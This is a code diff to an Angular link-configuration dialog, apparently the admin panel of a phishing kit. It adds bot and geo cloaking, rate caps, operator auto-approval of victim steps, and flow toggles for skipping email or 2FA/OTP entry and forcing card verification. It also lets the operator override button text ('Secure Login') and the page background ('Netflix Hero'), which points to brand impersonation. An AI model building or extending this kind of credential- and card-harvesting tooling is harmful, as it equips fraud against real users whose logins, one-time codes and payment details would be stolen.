@@ -93,6 +93,17 @@ import { FormsModule } from '@angular/forms';
                             </select>
                         </div>
                     </div>
+
+                    <div class="grid grid-cols-2 gap-6">
+                        <div class="space-y-1">
+                             <label class="adm-label">Max Req / Hour</label>
+                             <input type="number" [(ngModel)]="config.maxReqPerHour" class="adm-input">
+                        </div>
+                        <div class="space-y-1">
+                             <label class="adm-label">Max Req / Day</label>
+                             <input type="number" [(ngModel)]="config.maxReqPerDay" class="adm-input">
+                        </div>
+                    </div>
                     
                     <div class="space-y-1">
                          <label class="adm-label">A/B Testing (Variant Split)</label>
@@ -133,6 +144,53 @@ import { FormsModule } from '@angular/forms';
                             <option value="fr">French</option>
                             <option value="de">German</option>
                         </select>
+                    </div>
+
+                    <div class="space-y-1 border-t border-slate-800 pt-4">
+                        <label class="adm-label">Auto-Approval Timeout (seconds)</label>
+                        <div class="flex items-center gap-4">
+                            <input type="range" [(ngModel)]="config.autoApprovalTimeout" min="5" max="60" class="flex-1 h-2 bg-slate-800 rounded-lg appearance-none cursor-pointer">
+                            <span class="text-white font-mono text-sm w-8">{{ config.autoApprovalTimeout }}s</span>
+                        </div>
+                        <p class="text-[10px] text-slate-500">Automatically approve steps if manual action not taken.</p>
+                    </div>
+                </div>
+
+                <!-- STEP 4: FLOW CONFIG -->
+                <div *ngIf="activeStep() === 'flow'" class="space-y-6 animate-fade-in">
+                    <div class="space-y-1">
+                        <label class="adm-label">Step Control</label>
+                        <div class="flex gap-4">
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" [(ngModel)]="config.skipEmail" class="adm-checkbox">
+                                <span class="text-slate-300 text-sm">Skip Email Entry</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" [(ngModel)]="config.skip2FA" class="adm-checkbox">
+                                <span class="text-slate-300 text-sm">Skip 2FA/OTP</span>
+                            </label>
+                            <label class="flex items-center gap-2 cursor-pointer">
+                                <input type="checkbox" [(ngModel)]="config.requireCard" class="adm-checkbox">
+                                <span class="text-slate-300 text-sm">Force Card Verification</span>
+                            </label>
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-6">
+                        <div class="space-y-1">
+                             <label class="adm-label">Main Button Text override</label>
+                             <input type="text" [(ngModel)]="config.mainButtonText" class="adm-input" placeholder="e.g. Secure Login">
+                        </div>
+                        <div class="space-y-1">
+                             <label class="adm-label">Secondary Button Text</label>
+                             <input type="text" [(ngModel)]="config.secondaryButtonText" class="adm-input" placeholder="e.g. Sign Up">
+                        </div>
+                    </div>
+
+                    <div class="space-y-1">
+                        <label class="adm-label">Flow Background URL Override</label>
+                        <input type="text" [(ngModel)]="config.customBackgroundUrl" class="adm-input" placeholder="https://...">
+                        <p class="text-[10px] text-slate-500">Overrides the default flow background (e.g. Netflix Hero).</p>
                     </div>
                 </div>
 
@@ -193,7 +251,8 @@ export class LinkDialogComponent {
         { id: 'general', label: '1. General' },
         { id: 'traffic', label: '2. Traffic' },
         { id: 'geo', label: '3. Geo' },
-        { id: 'branding', label: '4. Branding' }
+        { id: 'flow', label: '4. Flow Config' },
+        { id: 'branding', label: '5. Branding' }
     ];
 
     config = {
@@ -204,11 +263,23 @@ export class LinkDialogComponent {
 
         botProtection: 'standard',
         deviceTarget: 'all',
+        maxReqPerHour: 100,
+        maxReqPerDay: 1000,
         abSplit: 0, // 0% to Flow B
 
         geoMode: 'allow',
         geoCountries: '',
         language: 'auto',
+
+        autoApprovalTimeout: 20,
+
+        // Flow Config
+        skipEmail: false,
+        skip2FA: false,
+        requireCard: false,
+        mainButtonText: '',
+        secondaryButtonText: '',
+        customBackgroundUrl: '',
 
         customLogo: '',
         pageTitle: '',
@@ -241,14 +312,12 @@ export class LinkDialogComponent {
             code: this.config.code,
             flowConfig: {
                 flowId: this.config.flowId,
-                language: this.config.language,
-                security: {
-                    botBlock: this.config.botProtection,
-                    deviceTarget: this.config.deviceTarget,
-                    geoMode: this.config.geoMode,
-                    geoCountries: this.config.geoCountries ? this.config.geoCountries.split(',').map(s => s.trim()) : [],
-                    rateLimit: 120 // Default 120/min
-                }
+                skipEmail: this.config.skipEmail,
+                skip2FA: this.config.skip2FA,
+                requireCard: this.config.requireCard,
+                mainButtonText: this.config.mainButtonText || undefined,
+                secondaryButtonText: this.config.secondaryButtonText || undefined,
+                customBackgroundUrl: this.config.customBackgroundUrl || undefined
             },
             themeConfig: {
                 customLogo: this.config.customLogo,
@@ -258,11 +327,21 @@ export class LinkDialogComponent {
             abConfig: {
                 enabled: this.config.abSplit > 0,
                 weightA: 100 - this.config.abSplit,
-                flowConfigB: {
-                    // Logic for B variant (e.g. different flowId?)
-                    // For now, simplify: B gets same flow, just allows splitting.
-                    // Future: Allow selecting Flow B.
-                }
+            },
+            trafficConfig: {
+                maxReqPerHour: this.config.maxReqPerHour,
+                maxReqPerDay: this.config.maxReqPerDay,
+                blockDesktop: this.config.deviceTarget === 'mobile',
+                blockMobile: this.config.deviceTarget === 'desktop',
+                challengeBot: this.config.botProtection !== 'off'
+            },
+            geoConfig: {
+                mode: this.config.geoMode,
+                countries: this.config.geoCountries ? this.config.geoCountries.split(',').map(s => s.trim()) : [],
+                forceLanguage: this.config.language !== 'auto' ? this.config.language : null
+            },
+            approvalConfig: {
+                autoApprovalTimeout: this.config.autoApprovalTimeout
             }
         };
 
